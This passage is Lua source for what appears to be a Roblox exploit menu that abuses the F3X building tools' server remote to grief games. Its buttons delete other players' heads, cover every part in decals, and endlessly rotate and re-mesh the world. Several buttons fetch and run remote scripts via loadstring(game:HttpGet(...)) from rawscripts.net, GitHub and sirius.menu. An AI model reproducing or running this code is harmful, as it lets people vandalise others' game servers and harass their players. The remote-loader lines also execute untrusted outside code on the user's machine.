								["Face"] = side,
								["TextureType"] = "Decal",
								["Texture"] = "rbxassetid://".. asset
							}
						}
					}
					_(args)
				end
	
				function spam(id)
					for i,v in game.workspace:GetDescendants() do
						if v:IsA("BasePart") then
							spawn(function()
								SetLocked(v,false)
								SpawnDecal(v,Enum.NormalId.Front)
								AddDecal(v,id,Enum.NormalId.Front)
	
								SpawnDecal(v,Enum.NormalId.Back)
								AddDecal(v,id,Enum.NormalId.Back)
	
								SpawnDecal(v,Enum.NormalId.Right)
								AddDecal(v,id,Enum.NormalId.Right)
	
								SpawnDecal(v,Enum.NormalId.Left)
								AddDecal(v,id,Enum.NormalId.Left)
	
								SpawnDecal(v,Enum.NormalId.Bottom)
								AddDecal(v,id,Enum.NormalId.Bottom)
	
								SpawnDecal(v,Enum.NormalId.Top)
								AddDecal(v,id,Enum.NormalId.Top)
							end)
						end
					end 
				end
				spam(text.Text)
			end)
	
		end;
		task.spawn(C_5a);
		-- StarterGui.f3xmain2.Frame.main.misc.base.LocalScript
		local function C_64()
			local script = G2L["64"];
			local b = script.Parent
	
			b.Activated:Connect(function()
				local function findBuildingTools()
					local buildingTools = nil
					local player = game:GetService("Players").LocalPlayer
	
					for _, item in pairs(player.Character:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							buildingTools = item
							break
						end
					end
	
					if not buildingTools then
						for _, item in pairs(player.Backpack:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								buildingTools = item
								break
							end
						end
					end
	
					return buildingTools
				end
	
				local buildingTools = findBuildingTools()
	
				if buildingTools then
					local syncAPI = buildingTools:FindFirstChild("SyncAPI")
					if syncAPI then
						local serverEndpoint = syncAPI:FindFirstChild("ServerEndpoint")
						if serverEndpoint then
							if workspace:FindFirstChild("SpawnLocation") then
								local args = {
									[1] = "Remove",
									[2] = {
										[1] = workspace.SpawnLocation
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
							else
								local args = {
									[1] = "CreatePart",
									[2] = "Spawn",
									[3] = CFrame.new(game.Players.LocalPlayer.Character["HumanoidRootPart"].Position) * CFrame.Angles(0, 0, 0),
									[4] = workspace
								}
								serverEndpoint:InvokeServer(unpack(args))
	
	
								local args = {
									[1] = "SyncResize",
									[2] = {
										[1] = {
											["Part"] = workspace.SpawnLocation,
											["CFrame"] = CFrame.new(game.Players.LocalPlayer.Character["HumanoidRootPart"].Position) * CFrame.Angles(-0, 0, -0),
											["Size"] = Vector3.new(999, 1, 999)
										}
									}
								}
	
								serverEndpoint:InvokeServer(unpack(args))
	
	
								local args = {
									[1] = "SetName",
									[2] = {
										[3] = workspace.SpawnLocation
									},
									[4] = "trapist-1"
								}
	
								serverEndpoint:InvokeServer(unpack(args))
	
	
							end
						end
					end
				end
			end)
	
		end;
		task.spawn(C_64);
		-- StarterGui.f3xmain2.Frame.main.misc.hd.LocalScript
		local function C_67()
			local script = G2L["67"];
			local b = script.Parent
			local warned = false
	
			b.Activated:Connect(function()
				local buildingtools = nil
				local player = game.Players.LocalPlayer
				for _, item in pairs(player.Character:GetChildren()) do
					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
						buildingtools = item
						break
					end
				end
	
				if not buildingtools then
					for _, item in pairs(player.Backpack:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							buildingtools = item
							break
						end
					end
				end
	
				if not buildingtools then
					if not warned then
						warn("Building tool not found")
						warned = true
					end
					return
				end
	
				local args1 = {
					[1] = "CreatePart",
					[2] = "Normal",
					[3] = CFrame.new(0, -999, 0) * CFrame.Angles(-0, 0, -0),
					[4] = workspace
				}
	
				buildingtools.SyncAPI.ServerEndpoint:InvokeServer(unpack(args1))
				wait(0.5)
	
				local args2 = {
					[1] = "CreateGroup",
					[2] = "Folder",
					[3] = workspace,
					[4] = {
						[1] = workspace.Part
					}
				}
	
				buildingtools.SyncAPI.ServerEndpoint:InvokeServer(unpack(args2))
				wait(0.5)
	
				local args3 = {
					[1] = "SetName",
					[2] = {
						[1] = workspace.Folder
					},
					[3] = "HDAdminWorkspaceFolder"
				}
	
				buildingtools.SyncAPI.ServerEndpoint:InvokeServer(unpack(args3))
			end)
	
		end;
		task.spawn(C_67);
		-- StarterGui.f3xmain2.Frame.main.misc.kill.LocalScript
		local function C_6a()
			local script = G2L["6a"];
			local b = script.Parent
			b.Activated:Connect(function()
				local function removehead()
					local localPlayer = game:GetService("Players").LocalPlayer
					local players = game:GetService("Players"):GetPlayers()
	
					for _, player in pairs(players) do
						if player ~= localPlayer then
							local character = player.Character
							if character and character:FindFirstChild("Head") then
								local head = character.Head
								local buildingTool = nil
	
								for _, item in pairs(localPlayer.Character:GetChildren()) do
									if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
										buildingTool = item
										break
									end
								end
	
								if not buildingTool then
									for _, item in pairs(localPlayer.Backpack:GetChildren()) do
										if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
											buildingTool = item
											break
										end
									end
								end
	
								if buildingTool then
									local syncAPI = buildingTool:FindFirstChild("SyncAPI")
									if syncAPI then
										local serverEndpoint = syncAPI:FindFirstChild("ServerEndpoint")
										if serverEndpoint then
											local args = {
												[1] = "Remove",
												[2] = {
													[1] = head
												}
											}
											serverEndpoint:InvokeServer(unpack(args))
										end
									end
								end
							end
						end
					end
				end
	
				removehead()
			end)
	
		end;
		task.spawn(C_6a);
		-- StarterGui.f3xmain2.Frame.main.misc.rotate.LocalScript
		local function C_6d()
			local script = G2L["6d"];
			local b = script.Parent
			local RunService = game:GetService("RunService")
			local localPlayer = game:GetService("Players").LocalPlayer
			local warned = false
	
			b.Activated:Connect(function()
				local partsToRotate = {}
	
				local function rotatePartSmoothly(part, targetRotation)
					local duration = 1
					local startRotation = part.CFrame
					local startTime = tick()
	
					local buildingTools = nil
	
					for _, item in pairs(localPlayer.Character:GetChildren()) do
						if item:IsA("Tool") and item:WaitForChild("SyncAPI") then
							buildingTools = item
							break
						end
					end
	
					if not buildingTools then
						for _, item in pairs(localPlayer.Backpack:GetChildren()) do
							if item:IsA("Tool") and item:WaitForChild("SyncAPI") then
								buildingTools = item
								break
							end
						end
					end
	
					if not buildingTools then
						if not warned then
							warn("Building tool not found!")
							warned = true
						end
						return
					end
	
					local function updateRotation()
						local elapsedTime = tick() - startTime
						local alpha = math.min(elapsedTime / duration, 1)
	
						local easedAlpha = (math.sin(alpha * math.pi - math.pi / 2) + 1) / 2
	
						local newRotation = startRotation:Lerp(targetRotation, easedAlpha)
	
						local args = {
							[1] = "SyncRotate",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = newRotation
								}
							}
						}
	
						buildingTools:WaitForChild("SyncAPI").ServerEndpoint:InvokeServer(unpack(args))
	
						if alpha < 1 then
							return true
						else
							return false
						end
					end
	
					local updateConnection
					updateConnection = RunService.Heartbeat:Connect(function()
						if not updateRotation() then
							updateConnection:Disconnect()
						end
					end)
				end
	
				local function collectParts(workspaceObject)
					partsToRotate = {}
	
					for _, obj in pairs(workspaceObject:GetDescendants()) do
						if (obj:IsA("Part") or obj:IsA("MeshPart")) and not obj:IsDescendantOf(localPlayer.Character) then
							table.insert(partsToRotate, obj)
						end
					end
				end
	
				local function startContinuousRotation()
					collectParts(workspace)
	
					for _, part in ipairs(partsToRotate) do
						while true do
							local randomRotation = CFrame.Angles(math.random() * math.pi, math.random() * math.pi, math.random() * math.pi)
	
							rotatePartSmoothly(part, randomRotation)
	
							wait(1)
						end
					end
				end
	
				startContinuousRotation()
			end)
	
		end;
		task.spawn(C_6d);
		-- StarterGui.f3xmain2.Frame.main.misc.mesh.LocalScript
		local function C_70()
			local script = G2L["70"];
			local b = script.Parent
			local warned = false
	
			b.Activated:Connect(function()
				local meshTypes = {
					Enum.MeshType.Brick,
					Enum.MeshType.Cylinder,
					Enum.MeshType.FileMesh,
					Enum.MeshType.Head,
					Enum.MeshType.Sphere,
					Enum.MeshType.Wedge
				}
	
				local function removemesh(part)
					for _, child in pairs(part:GetChildren()) do
						if child:IsA("MeshPart") or child:IsA("SpecialMesh") then
							local argsRemove = {
								[1] = "Remove",
								[2] = {
									[1] = child
								}
							}
	
							local buildingTools = nil
							local player = game:GetService("Players").LocalPlayer
	
							for _, item in pairs(player.Character:GetChildren()) do
								if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
									buildingTools = item
									break
								end
							end
	
							if not buildingTools then
								for _, item in pairs(player.Backpack:GetChildren()) do
									if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
										buildingTools = item
										break
									end
								end
							end
	
							if buildingTools then
								buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsRemove))
							elseif not warned then
								warn("Building tool not found")
								warned = true
							end
						end
					end
				end
	
				local function applymesh(part)
					removemesh(part)
	
					local randomMeshType = meshTypes[math.random(1, #meshTypes)]
	
					local argsCreate = {
						[1] = "CreateMeshes",
						[2] = {
							[1] = {
								["Part"] = part
							}
						}
					}
	
					local argsSync = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["MeshType"] = randomMeshType,
								["Part"] = part
							}
						}
					}
	
					local buildingTools = nil
					local player = game:GetService("Players").LocalPlayer
	
					for _, item in pairs(player.Character:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							buildingTools = item
							break
						end
					end
	
					if not buildingTools then
						for _, item in pairs(player.Backpack:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								buildingTools = item
								break
							end
						end
					end
	
					if buildingTools then
						buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsCreate))
						buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsSync))
					elseif not warned then
						warn("Building tool not found")
						warned = true
					end
				end
	
				local function mesh(work)
					for _, obj in pairs(work:GetDescendants()) do
						if obj.Name ~= "sky" and (obj:IsA("Part") or obj:IsA("MeshPart")) then
							applymesh(obj)
						end
					end
				end
	
				while true do
					mesh(workspace)
					wait()
				end
			end)
	
		end;
		task.spawn(C_70);
		-- StarterGui.f3xmain2.Frame.main2.localplayer.trail.LocalScript
		local function C_7a()
			local script = G2L["7a"];
			local b = script.Parent
			b.Activated:Connect(function()
				local Players = game:GetService("Players")
				local RunService = game:GetService("RunService")
				local function getBuildingTool(player)
					local buildingTool = nil
					for _, item in pairs(player.Character:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							buildingTool = item
							break
						end
					end
	
					if not buildingTool then
						for _, item in pairs(player.Backpack:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								buildingTool = item
								break
							end
						end
					end
					return buildingTool
				end
				local function createTrailBehindPlayer(player)
					local buildingTool = getBuildingTool(player)
					if buildingTool then
						local syncAPI = buildingTool:FindFirstChild("SyncAPI")
						if syncAPI then
							local serverEndpoint = syncAPI:FindFirstChild("ServerEndpoint")
							if serverEndpoint then
								local lastPosition = player.Character.HumanoidRootPart.Position
								RunService.Heartbeat:Connect(function()
									if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
										local playerPos = player.Character.HumanoidRootPart.Position
										local movementDirection = playerPos - lastPosition
										if movementDirection.magnitude > 0.5 then
											local partPosition = playerPos - player.Character.HumanoidRootPart.CFrame.LookVector * 5
											local partOrientation = CFrame.lookAt(partPosition, playerPos)
											local args = {
												[1] = "CreatePart",
												[2] = "Normal",
												[3] = partOrientation,
												[4] = workspace
											}
											serverEndpoint:InvokeServer(unpack(args))
											lastPosition = playerPos
										end
									end
								end)
							end
						end
					end
				end
				Players.PlayerAdded:Connect(function(player)
					player.CharacterAdded:Connect(function(character)
						createTrailBehindPlayer(player)
					end)
				end)
				for _, player in pairs(Players:GetPlayers()) do
					if player.Character then
						createTrailBehindPlayer(player)
					end
				end
			end)
	
		end;
		task.spawn(C_7a);
		-- StarterGui.f3xmain2.Frame.main2.localplayer.laserknife.LocalScript
		local function C_7d()
			local script = G2L["7d"];
			local b = script.Parent
			b.Activated:Connect(function()
				loadstring(game:HttpGet('https://rawscripts.net/raw/F3X-Workspace-script-that-lets-u-have-a-lsaer-knife-22875'))()
			end)
		end;
		task.spawn(C_7d);
		-- StarterGui.f3xmain2.Frame.main2.localplayer.walkspeed.LocalScript
		local function C_80()
			local script = G2L["80"];
			local b = script.Parent
			b.Activated:Connect(function()
				local player = game.Players.LocalPlayer
				player.Character.Humanoid.WalkSpeed = script.Parent.Parent.speed.Text
			end)
		end;
		task.spawn(C_80);
		-- StarterGui.f3xmain2.Frame.main2.localplayer.jump.LocalScript
		local function C_83()
			local script = G2L["83"];
			local b = script.Parent
			b.Activated:Connect(function()
				local player = game.Players.LocalPlayer
				player.Character.Humanoid.WalkSpeed = script.Parent.Parent.jump.Text
			end)
		end;
		task.spawn(C_83);
		-- StarterGui.f3xmain2.Frame.main2.hd.MML.LocalScript
		local function C_8f()
			local script = G2L["8f"];
			local b = script.Parent
			b.Activated:Connect(function()
				loadstring(game:HttpGet(('https://raw.githubusercontent.com/rusello25/scripts/main/mml%20admin'),true))()
			end)
		end;
		task.spawn(C_8f);
		-- StarterGui.f3xmain2.Frame.main2.hd.gghub.LocalScript
		local function C_92()
			local script = G2L["92"];
			local b = script.Parent
			b.Activated:Connect(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/lukee5644/lukee5644/refs/heads/main/GG%20Hub%20Remaster"))()
			end)
		end;
		task.spawn(C_92);
		-- StarterGui.f3xmain2.Frame.main2.universal.rc7.LocalScript
		local function C_9a()
			local script = G2L["9a"];
			local b = script.Parent
			b.Activated:Connect(function()
				loadstring(game:HttpGet(('https://rawscripts.net/raw/Universal-Script-RC7-Script-28745'),true))()
			end)
		end;
		task.spawn(C_9a);
		-- StarterGui.f3xmain2.Frame.main2.universal.sirius.LocalScript
		local function C_9d()
			local script = G2L["9d"];
			local b = script.Parent
			b.Activated:Connect(function()
				loadstring(game:HttpGet('https://sirius.menu/script'))();
				wait(2)
				print("Thanks for using script. (NOT MY!)")
			end)
		end;
		task.spawn(C_9d);
		-- StarterGui.f3xmain2.Frame.switch.LocalScript
		local function C_a1()
			local script = G2L["a1"];
			local b = script.Parent
			local page1 = script.Parent.Parent.main
			local page2 = script.Parent.Parent.main2
			local page3 = script.Parent.Parent.main3
	
			local page = 1
	
			local pages = {page1, page2, page3}
			local pagen = {"Page 1", "Page 2", "Page 3"}
			local function switch()
				for _, page in pairs(pages) do
					page.Visible = false
				end
				page = page % #pages + 1
				pages[page].Visible = true
				b.Text = pagen[page]
			end
	
			b.Activated:Connect(switch)
	
		end;
		task.spawn(C_a1);
		-- StarterGui.f3xmain2.Frame.main3.skies.chip.LocalScript
		local function C_ac()
			local script = G2L["ac"];
			imageOne="http://www.roblox.com/asset/?id=14669260354"
			imageTwo="http://www.roblox.com/asset/?id=14669262932"
			imageThree="http://www.roblox.com/asset/?id=14669265393"
			imageFour="http://www.roblox.com/asset/?id=14669267305"
			imageFive="http://www.roblox.com/asset/?id=14669295808"
			imageSix="http://www.roblox.com/asset/?id=14669271160"
			imageSeven="http://www.roblox.com/asset/?id=14669277991"
			imageEight="http://www.roblox.com/asset/?id=14669280746"
			ImageNine="http://www.roblox.com/asset/?id=14669288024"
			ImageTen="http://www.roblox.com/asset/?id=14669284236"
	
			local images = {imageOne, imageTwo, imageThree, imageFour, imageFive, imageSix, imageSeven, imageEight, ImageNine, ImageTen}
	
			local warned = false
	
			script.Parent.Activated:Connect(function()
				local function findBuildingTools()
					local buildingTools = nil
					local player = game:GetService("Players").LocalPlayer
	
					for _, item in pairs(player.Character:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							buildingTools = item
							break
						end
					end
	
					if not buildingTools then
						for _, item in pairs(player.Backpack:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								buildingTools = item
								break
							end
						end
					end
	
					return buildingTools
				end
	
				local buildingTools = findBuildingTools()
	
				if buildingTools then
					local syncAPI = buildingTools:FindFirstChild("SyncAPI")
					if syncAPI then
						local serverEndpoint = syncAPI:FindFirstChild("ServerEndpoint")
						if serverEndpoint then
							if workspace:FindFirstChild("sky") then
								local args = {
									[1] = "Remove",
									[2] = {
										[1] = workspace.sky
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
							else
								local args = {
									[1] = "CreatePart",
									[2] = "Normal",
									[3] = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position) * CFrame.Angles(0, 0, 0),
									[4] = workspace
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SetName",
									[2] = {
										[1] = workspace.Part
									},
									[3] = "sky"
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncCollision",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["CanCollide"] = false
										}
									}
								}
	
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SetLocked",
									[2] = {
										[1] = workspace.sky
									},
									[3] = true
								}
	
								serverEndpoint:InvokeServer(unpack(args))
	
	
								local args = {
									[1] = "CreateMeshes",
									[2] = {
										[1] = {
											["Part"] = workspace.sky
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["MeshType"] = Enum.MeshType.FileMesh,
											["Part"] = workspace.sky
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["MeshId"] = "rbxassetid://111891702759441"
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["Scale"] = Vector3.new(4000, 4000, 4000)
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								while true do
									for _, image in ipairs(images) do
										local args = {
											[1] = "SyncMesh",
											[2] = {
												[1] = {
													["Part"] = workspace.sky,
													["TextureId"] = image
												}
											}
										}
										serverEndpoint:InvokeServer(unpack(args))
										wait(0.1)
									end
								end
							end
						end
					end
				end
			end)
		end;
		task.spawn(C_ac);
		-- StarterGui.f3xmain2.Frame.main3.skies.skeleton.LocalScript
		local function C_ae()
			local script = G2L["ae"];
			imageOne = "http://www.roblox.com/asset/?id=169585459"
			imageTwo = "http://www.roblox.com/asset/?id=169585475"
			imageThree = "http://www.roblox.com/asset/?id=169585485"
			imageFour = "http://www.roblox.com/asset/?id=169585502"
			imageFive = "http://www.roblox.com/asset/?id=169585515"
			imageSix = "http://www.roblox.com/asset/?id=169585502"
			imageSeven = "http://www.roblox.com/asset/?id=169585485"
			imageEight = "http://www.roblox.com/asset/?id=169585475"
	
			local images = {imageOne, imageTwo, imageThree, imageFour, imageFive, imageSix, imageSeven, imageEight}
	
			local warned = false
	
			script.Parent.Activated:Connect(function()
				local function findBuildingTools()
					local buildingTools = nil
					local player = game:GetService("Players").LocalPlayer
	
					for _, item in pairs(player.Character:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							buildingTools = item
							break
						end
					end
	
					if not buildingTools then
						for _, item in pairs(player.Backpack:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								buildingTools = item
								break
							end
						end
					end
	
					return buildingTools
				end
	
				local buildingTools = findBuildingTools()
	
				if buildingTools then
					local syncAPI = buildingTools:FindFirstChild("SyncAPI")
					if syncAPI then
						local serverEndpoint = syncAPI:FindFirstChild("ServerEndpoint")
						if serverEndpoint then
							if workspace:FindFirstChild("sky") then
								local args = {
									[1] = "Remove",
									[2] = {
										[1] = workspace.sky
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
							else
								local args = {
									[1] = "CreatePart",
									[2] = "Normal",
									[3] = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position) * CFrame.Angles(0, 0, 0),
									[4] = workspace
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SetName",
									[2] = {
										[1] = workspace.Part
									},
									[3] = "sky"
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncCollision",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["CanCollide"] = false
										}
									}
								}
	
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SetLocked",
									[2] = {
										[1] = workspace.sky
									},
									[3] = true
								}
	
								serverEndpoint:InvokeServer(unpack(args))
	
	
								local args = {
									[1] = "CreateMeshes",
									[2] = {
										[1] = {
											["Part"] = workspace.sky
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["MeshType"] = Enum.MeshType.FileMesh,
											["Part"] = workspace.sky
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["MeshId"] = "rbxassetid://111891702759441"
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["Scale"] = Vector3.new(4000, 4000, 4000)
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								while true do
									for _, image in ipairs(images) do
										local args = {
											[1] = "SyncMesh",
											[2] = {
												[1] = {
													["Part"] = workspace.sky,
													["TextureId"] = image
												}
											}
										}
										serverEndpoint:InvokeServer(unpack(args))
										wait(0.1)
									end
								end
							end
						end
					end
				end
			end)
		end;
		task.spawn(C_ae);
		-- StarterGui.f3xmain2.Frame.main3.skies.geometry.LocalScript
		local function C_b2()
			local script = G2L["b2"];
			imageOne="http://www.roblox.com/asset/?id=135024233342555"
			imageTwo="http://www.roblox.com/asset/?id=133039523050688"
			imageThree="http://www.roblox.com/asset/?id=94268697504701"
			imageFour="http://www.roblox.com/asset/?id=132507018134136"
			imageFive="http://www.roblox.com/asset/?id=95835007909992"
			imageSix="http://www.roblox.com/asset/?id=100580223340411"
			imageSeven="http://www.roblox.com/asset/?id=86886563303393"
			imageEight="http://www.roblox.com/asset/?id=71539814221156"
			ImageNine="http://www.roblox.com/asset/?id=120096274974418"
			ImageTen="http://www.roblox.com/asset/?id=78136310468942"
	
			local images = {imageOne, imageTwo, imageThree, imageFour, imageFive, imageSix, imageSeven, imageEight, ImageNine, ImageTen}
	
			local warned = false
	
			script.Parent.Activated:Connect(function()
				local function findBuildingTools()
					local buildingTools = nil
					local player = game:GetService("Players").LocalPlayer
	
					for _, item in pairs(player.Character:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							buildingTools = item
							break
						end
					end
	
					if not buildingTools then
						for _, item in pairs(player.Backpack:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								buildingTools = item
								break
							end
						end
					end
	
					return buildingTools
				end
	
				local buildingTools = findBuildingTools()
	
				if buildingTools then
					local syncAPI = buildingTools:FindFirstChild("SyncAPI")
					if syncAPI then
						local serverEndpoint = syncAPI:FindFirstChild("ServerEndpoint")
						if serverEndpoint then
							if workspace:FindFirstChild("sky") then
								local args = {
									[1] = "Remove",
									[2] = {
										[1] = workspace.sky
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
							else
								local args = {
									[1] = "CreatePart",
									[2] = "Normal",
									[3] = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position) * CFrame.Angles(0, 0, 0),
									[4] = workspace
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SetName",
									[2] = {
										[1] = workspace.Part
									},
									[3] = "sky"
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncCollision",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["CanCollide"] = false
										}
									}
								}
	
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SetLocked",
									[2] = {
										[1] = workspace.sky
									},
									[3] = true
								}
	
								serverEndpoint:InvokeServer(unpack(args))
	
	
								local args = {
									[1] = "CreateMeshes",
									[2] = {
										[1] = {
											["Part"] = workspace.sky
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["MeshType"] = Enum.MeshType.FileMesh,
											["Part"] = workspace.sky
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["MeshId"] = "rbxassetid://111891702759441"
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["Scale"] = Vector3.new(4000, 4000, 4000)
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								while true do
									for _, image in ipairs(images) do
										local args = {
											[1] = "SyncMesh",
											[2] = {
												[1] = {
													["Part"] = workspace.sky,
													["TextureId"] = image
												}
											}
										}
										serverEndpoint:InvokeServer(unpack(args))
										wait(0.1)
									end
								end
							end
						end
					end
				end
			end)
		end;
		task.spawn(C_b2);
		-- StarterGui.f3xmain2.Frame.main3.skies.cow.LocalScript
		local function C_b5()
			local script = G2L["b5"];
			imageOne="http://www.roblox.com/asset/?id=117346754765620"
			imageTwo="http://www.roblox.com/asset/?id=136065273416790"
			imageThree="http://www.roblox.com/asset/?id=82489787255431"
			imageFour="http://www.roblox.com/asset/?id=80680534031118"
			imageFive="http://www.roblox.com/asset/?id=125323131986149"
			imageSix="http://www.roblox.com/asset/?id=126011902781753"
			imageSeven="http://www.roblox.com/asset/?id=114271095085345"
			imageEight="http://www.roblox.com/asset/?id=87622513959517"
			ImageNine="http://www.roblox.com/asset/?id=73516940549372"
			ImageTen="http://www.roblox.com/asset/?id=125293221585340"
	
			local images = {imageOne, imageTwo, imageThree, imageFour, imageFive, imageSix, imageSeven, imageEight, ImageNine, ImageTen}
	
			local warned = false
	
			script.Parent.Activated:Connect(function()
				local function findBuildingTools()
					local buildingTools = nil
					local player = game:GetService("Players").LocalPlayer
	
					for _, item in pairs(player.Character:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							buildingTools = item
							break
						end
					end
	
					if not buildingTools then
						for _, item in pairs(player.Backpack:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								buildingTools = item
								break
							end
						end
					end
	
					return buildingTools
				end
	
				local buildingTools = findBuildingTools()
	
				if buildingTools then
					local syncAPI = buildingTools:FindFirstChild("SyncAPI")
					if syncAPI then
						local serverEndpoint = syncAPI:FindFirstChild("ServerEndpoint")
						if serverEndpoint then
							if workspace:FindFirstChild("sky") then
								local args = {
									[1] = "Remove",
									[2] = {
										[1] = workspace.sky
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
							else
								local args = {
									[1] = "CreatePart",
									[2] = "Normal",
									[3] = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position) * CFrame.Angles(0, 0, 0),
									[4] = workspace
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SetName",
									[2] = {
										[1] = workspace.Part
									},
									[3] = "sky"
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncCollision",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["CanCollide"] = false
										}
									}
								}
	
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SetLocked",
									[2] = {
										[1] = workspace.sky
									},
									[3] = true
								}
	
								serverEndpoint:InvokeServer(unpack(args))
	
	
								local args = {
									[1] = "CreateMeshes",
									[2] = {
										[1] = {
											["Part"] = workspace.sky
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["MeshType"] = Enum.MeshType.FileMesh,
											["Part"] = workspace.sky
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["MeshId"] = "rbxassetid://111891702759441"
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["Scale"] = Vector3.new(4000, 4000, 4000)
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								while true do
									for _, image in ipairs(images) do
										local args = {
											[1] = "SyncMesh",
											[2] = {
												[1] = {
													["Part"] = workspace.sky,
													["TextureId"] = image
												}
											}
										}
										serverEndpoint:InvokeServer(unpack(args))
										wait(0.06)
									end
								end
							end
						end
					end
				end
			end)
		end;
		task.spawn(C_b5);
		-- StarterGui.f3xmain2.Frame.main3.skies.banana.LocalScript
		local function C_b8()
			local script = G2L["b8"];
			imageOne="http://www.roblox.com/asset/?id=4585047437"
			imageTwo="http://www.roblox.com/asset/?id=4585060260" 
			imageThree="http://www.roblox.com/asset/?id=4585047552" 
			imageFour="http://www.roblox.com/asset/?id=4585047675" 
			imageFive="http://www.roblox.com/asset/?id=4585047724" 
			imageSix="http://www.roblox.com/asset/?id=4585047761"
			imageSeven="http://www.roblox.com/asset/?id=4585047818" 
			imageEight="http://www.roblox.com/asset/?id=4585047874" 
			ImageNine="http://www.roblox.com/asset/?id=4585060365" 
			ImageTen="http://www.roblox.com/asset/?id=4585047987" 
	
			local images = {imageOne, imageTwo, imageThree, imageFour, imageFive, imageSix, imageSeven, imageEight, ImageNine, ImageTen}
	
			local warned = false
	
			script.Parent.Activated:Connect(function()
				local function findBuildingTools()
